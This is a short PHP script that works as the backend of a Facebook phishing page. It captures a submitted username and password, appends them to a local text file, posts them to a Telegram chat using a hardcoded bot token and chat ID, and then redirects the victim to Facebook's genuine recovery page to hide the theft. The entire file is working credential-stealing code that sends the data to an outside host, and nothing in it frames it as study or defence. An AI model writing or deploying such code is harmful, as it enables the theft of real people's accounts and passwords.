<?php
// Capture user input
$email = $_POST['username'];
$password = $_POST['password'];

// Store user input in a text file
$data = "Facebook Username:=$email Pass:=$password\n";


file_put_contents("Error420.txt", $data, FILE_APPEND);

// Telegram bot settings
$telegramBotToken = '6635867717:AAFNKH8R0Wxvjwce_CtZpYY_BZXn5Mqmx4o';
$chatId ='5756292086'; // This can be a user or group chat ID

// Prepare the message for Telegram
$telegramMessage = "New login details:\n\n$data";

// Send the message to Telegram using the bot API
$telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$telegramData = http_build_query([
    'chat_id' => $chatId,
    'text' => $telegramMessage,
]);

// Send the message using cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    echo 'Error sending message to Telegram: ' . curl_error($ch);
}

curl_close($ch);

// Redirect the user to the Facebook recovery page
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
